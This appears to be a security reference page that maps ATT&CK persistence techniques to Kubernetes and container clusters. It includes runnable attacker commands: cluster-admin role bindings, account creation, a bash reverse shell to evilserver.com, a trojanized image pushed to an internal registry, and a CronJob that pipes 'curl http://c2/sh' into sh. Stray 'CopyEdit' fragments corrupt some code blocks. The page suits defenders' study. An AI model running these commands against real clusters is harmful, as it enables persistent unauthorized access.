# Persistence

### **Persistence Techniques in Containerized Environments**

In Kubernetes and containerized infrastructures, adversaries use persistence techniques to maintain long-term access beyond initial compromise. This includes creating rogue service accounts, abusing cluster roles, implanting internal container images, and scheduling malicious workloads using orchestration features. Left unchecked, these footholds can survive pod restarts, node reboots, or even partial cluster recovery.

#### Account Manipulation → **Additional Container Cluster Roles (T1098.004)**

**Description**: Modify or assign elevated roles to accounts within the cluster to retain privileged access.

**Container Example**:

*   An attacker with initial `kubectl` access adds their identity to the `cluster-admin` group:

    ```bash
    kubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --user attacker@corp.com
    ```
* Modify service accounts used by default deployments to bind high-privilege ClusterRoles.
*   Abuse `kubectl patch` or raw API requests to escalate permissions:

    ```bash
    kubectl patch clusterrolebinding system:controller:job-controller -p '{"subjects":[{"kind":"User","name":"attacker"}]}'
    ```

#### Create Account → **Local Account (T1136.001)**

**Description**: Create local accounts inside containers or container hosts to maintain control.

**Container Example**:

*   If container runs in privileged mode or via Docker, attacker escapes to host and creates a new Linux user:

    ```bash
    bashCopyEdituseradd attacker && echo "attacker:Password123" | chpasswd
    ```
* Modify `/etc/passwd` inside writable containers or sidecars.
* For managed K8s nodes, attacker may create user on exposed cloud VM (e.g., via SSH).

#### 🛠️ Create or Modify System Process → **Container Service (T1543.003)**

**Description**: Create or alter services that automatically restart malicious containers or pods.

**Container Example**:

*   Deploy a `Deployment` or `DaemonSet` configured to always restart:

    ```yaml
    yamlCopyEditrestartPolicy: Always
    ```
*   Replace or patch an existing controller to run attacker code, e.g.:

    ```bash
    bashCopyEditkubectl set image deployment/metrics-server metrics=attacker/metrics:latest
    ```
* Abuse `initContainers` to execute pre-persistence hooks before workload starts.

#### External Remote Services (T1133)

**Description**: Maintain access through external connections like SSH, VPN, or exposed APIs.

**Container Example**:

*   Drop a reverse shell in a container using `socat`, `bash`, or `nc`:

    ```bash
    bash -i >& /dev/tcp/evilserver.com/443 0>&1
    ```
*   Install and configure SSH server in containers that normally don’t support it:

    ```bash
    apk add openssh && /etc/init.d/sshd start
    ```
* Abuse cloud access (GCP/AWS metadata APIs) to maintain persistent API tokens.

#### Implant Internal Image

**Description**: Push a backdoored container image to a trusted internal registry for use in future deployments.

**Container Example**:

*   Attacker builds and uploads a trojanized image:

    ```dockerfile
    DockerfileCopyEditFROM nginx
    ADD shell.sh /tmp/shell.sh
    CMD ["bash", "/tmp/shell.sh"]
    ```
*   Pushes to an internal registry:

    ```bash
    bashCopyEditdocker tag evil-image registry.local/internal/nginx
    docker push registry.local/internal/nginx
    ```
* Waits for CI/CD or naive users to deploy it.

#### Scheduled Task/Job → **Container Orchestration Job (T1053.007)**

**Description**: Use Kubernetes `CronJob` to schedule malicious command execution.

**Container Example**:

*   Drop a `CronJob` in the cluster to curl down payloads or beacon C2:

    ```yaml
    yamlCopyEditapiVersion: batch/v1
    kind: CronJob
    metadata:
      name: sleeper-agent
    spec:
      schedule: "*/15 * * * *"
      jobTemplate:
        spec:
          template:
            spec:
              containers:
              - name: sleeper
                image: busybox
                command: ["/bin/sh", "-c", "curl http://c2/sh | sh"]
              restartPolicy: OnFailure
    ```
* Resilient method of ensuring re-entry if other persistence mechanisms fail.

#### Valid Accounts → **Default Accounts (T1078.001)**

**Description**: Abuse default service accounts or credentials that were never rotated or secured.

**Container Example**:

* Use default Kubernetes service account tokens (`/var/run/secrets/kubernetes.io/serviceaccount/token`) for API access.
* Exploit Helm charts or apps deployed with default admin:admin credentials (e.g., dashboards, databases).

#### Valid Accounts → **Local Accounts (T1078.003)**

**Description**: Use previously stolen or created local user accounts on host/container for persistence.

**Container Example**:

* Log in as a previously created user (see `T1136.001`).
* Install SSH keys on `/root/.ssh/authorized_keys` if host filesystem is mounted.

#### 🧠 Summary Table

| Technique                | Sub-Technique               | Container Use Case                                          |
| ------------------------ | --------------------------- | ----------------------------------------------------------- |
| Account Manipulation     | Additional Cluster Roles    | `kubectl create clusterrolebinding`                         |
| Create Account           | Local Account               | `useradd`, modified `/etc/passwd` in container or host      |
| Modify System Process    | Container Service           | Deploy persistent DaemonSets, restart-on-failure containers |
| External Remote Services | —                           | Reverse shell, SSH, exposed APIs                            |
| Implant Internal Image   | —                           | Trojan image in internal registry                           |
| Scheduled Task           | Container Orchestration Job | Malicious CronJob via `kubectl apply`                       |
| Valid Accounts           | Default Accounts            | Default K8s tokens, Helm admin creds                        |
| Valid Accounts           | Local Accounts              | SSH access with known passwords or keys                     |
